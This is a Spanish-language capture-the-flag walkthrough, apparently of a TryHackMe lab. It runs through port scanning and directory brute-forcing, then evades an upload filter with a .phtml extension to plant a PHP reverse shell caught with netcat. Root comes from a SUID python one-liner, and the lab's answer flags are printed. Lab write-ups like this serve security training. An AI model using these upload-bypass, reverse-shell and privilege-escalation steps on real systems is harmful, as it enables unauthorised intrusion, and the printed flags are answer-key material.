# 1. Reconocimiento

Primero, obtengamos información sobre el objetivo.

## a) Escanee la máquina, ¿cuántos puertos están abiertos?

Comenzamos haciendo un escaneo básico con Nmap, para descubrir los puertos abiertos y sus servicios. Usamos:

```
nmap -sV -T5 10.10.87.98
```

Vemos, dos puertos abiertos, el 22 y el 80

![](IMG/Pasted%20image%2020250412204211.png)

**Respuesta: 2**

## b) ¿Qué versión de Apache está ejecutándose?

Cómo vimos en la captura de la pregunta anterior, la version de Apache es la 2.4.29

**Respuesta: 2.4.29**

## c) ¿Qué servicio se está ejecutando en el puerto 22?

El servicio ejecutándose en el puerto 22 es SSH.

**Respuesta: SSH**

## d) Encuentre directorios en el servidor web utilizando la herramienta GoBuster.

Usaremos GoBuster, de esta forma:

```
gobuster dir -u http://10.10.87.98 -w /usr/share/dirb/wordlists/common.txt
```

Este es el resultado obtenido.

![](IMG/Pasted%20image%2020250412205004.png)

## e) ¿Cuál es el directorio oculto?

El directorio oculto es /panel/, si accedemos a él, obtenemos un formulario que nos permite subir archivos.

![](IMG/Pasted%20image%2020250412205351.png)

**Respuesta: /panel/**

# 2. Conseguir una shell

Busque una forma para cargar y obtener un shell inverso, y busque la bandera.

## a) user.txt

Trataremos de usar el formulario que hemos encontrado en /panel/ para tratar de cargar un archivo php que nos consiga una shell reversa. Usaremos la shell reversa de [Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell)

![](IMG/Pasted%20image%2020250412210916.png)

Una vez descargado el archivo php, lo configuraremos con la ip de nuestra máquina y el puerto por el que escucharemos.

![](IMG/Pasted%20image%2020250412211040.png)

Cuando lo hayamos configurado, lo haremos ejecutable usando:

```
sudo chmod +x php-reverse-shell.php
```

lo subiremos con el formulario, y nos dará error. Se debe a la extensión del archivo, ya que no está permitida la subida de archivos php.

![](IMG/Pasted%20image%2020250412211121.png)

Así que trataremos de hacer bypass cambiándole la extensión al archivo. Usaremos:

```
mv php-reverse-shell.php php-reverse-shell.phtml
```

![](IMG/Pasted%20image%2020250412211830.png)

Y tratamos de subirlo de nuevo.

![](IMG/Pasted%20image%2020250412211908.png)

Y ahora sí, ya nos ha permitido subirlo. Lo siguiente que haremos será activar un listener con netcat, usamos:

```
nc -lvnp 1234
```

![](IMG/Pasted%20image%2020250412212608.png)

Y ahora, ejecutamos la shell reversa que acabamos de subir, que se encuentra en el directorio /uploads

![](IMG/Pasted%20image%2020250412212644.png)

```
http://10.10.87.98/uploads/php-reverse-shell.phtml
```

Y, una vez ejecutada, obtenemos nuestra shell.

![](IMG/Pasted%20image%2020250412212818.png)

Ahora, lo que haremos será conseguir que nuestra shell, sea una consola estable, para ello haremos (esto lo hemos encontrado por internet, porque no se muy bien como lo hace):

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

![](IMG/Pasted%20image%2020250412214354.png)

Y buscaremos el archivo user.txt, usando:

```
find / -type f -name user.txt 2> /dev/null
```

![](IMG/Pasted%20image%2020250412214446.png)

Y sabiendo la ruta, lo abrimos para ver la flag.

![](IMG/Pasted%20image%2020250412214530.png)

**Respuesta: THM{y0u_g0t_a_sh3ll}**

# 3. Escalada de privilegios

Ahora que tenemos una shell, escalemos nuestros privilegios a root.

## a) Buscar archivos con permiso SUID, ¿qué archivo es extraño?

Buscamos los archivos usando lo siguiente (esta parte es encontrada en internet y no me he enterado de porque funciona, pero se supone que es así):

```
find / -perm -u=s type f 2> /dev/null
```

Esto nos da un listado de los archivos que tienen permiso SUID activo.

del listado que nos da, el que se supone que es, es el /usr/bin/python

**Respuesta: /usr/bin/python**

## b) Encuentre una forma para aumentar sus privilegios.

Y sabiendo eso, se supone que ejecutamos:

```
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

![](IMG/Pasted%20image%2020250412215446.png)

Y ya tendríamos acceso root.

## c) root.txt

Ya solo tenemos que entrar en el directorio root y abrir el archivo root.txt para ver la flag.

![](IMG/Pasted%20image%2020250412215605.png)

**Respuesta: THM{pr1v1l3g3_3sc4l4t10n}**